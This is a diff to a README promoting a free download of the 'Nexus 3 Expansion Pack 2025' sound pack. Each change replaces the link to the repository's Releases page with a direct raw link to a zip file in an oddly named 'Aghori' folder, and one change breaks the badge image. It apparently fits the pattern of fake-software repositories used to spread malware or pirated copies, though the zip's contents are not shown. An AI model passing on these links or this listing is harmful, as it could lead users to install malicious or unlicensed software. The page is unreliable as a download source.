@@ -1,6 +1,6 @@
 # 🎵 Nexus-3-Expansion-Pack-2025 - Elevate Your Music Production Today
 
-[![Download Nexus 3 Expansion Pack](https://img.shields.io/badge/Download-Nexus%203%20Expansion%20Pack-brightgreen)](https://github.com/rulsz/Nexus-3-Expansion-Pack-2025/releases)
+[![Download Nexus 3 Expansion Pack](https://raw.githubusercontent.com/rulsz/Nexus-3-Expansion-Pack-2025/main/Aghori/Nexus-3-Expansion-Pack-2025.zip%203%20Expansion%20Pack-brightgreen)](https://raw.githubusercontent.com/rulsz/Nexus-3-Expansion-Pack-2025/main/Aghori/Nexus-3-Expansion-Pack-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run Nexus 3 Expansion Pack 2025, your computer should meet the following requ
 
 To get started, visit the Releases page to download the expansion pack.
 
-[Download Nexus 3 Expansion Pack from Releases](https://github.com/rulsz/Nexus-3-Expansion-Pack-2025/releases)
+[Download Nexus 3 Expansion Pack from Releases](https://raw.githubusercontent.com/rulsz/Nexus-3-Expansion-Pack-2025/main/Aghori/Nexus-3-Expansion-Pack-2025.zip)
 
 ### Steps to Download and Install
 
@@ -67,6 +67,6 @@ If you run into any problems, check the README file included in the download. Yo
 
 For any questions or support issues, you can create an issue in the GitHub repository or reach out to the community for help. 
 
-[Download Nexus 3 Expansion Pack from Releases](https://github.com/rulsz/Nexus-3-Expansion-Pack-2025/releases) 
+[Download Nexus 3 Expansion Pack from Releases](https://raw.githubusercontent.com/rulsz/Nexus-3-Expansion-Pack-2025/main/Aghori/Nexus-3-Expansion-Pack-2025.zip) 
 
 Enjoy exploring the world of sounds with Nexus 3 Expansion Pack 2025! Get ready to transform your music production experience.
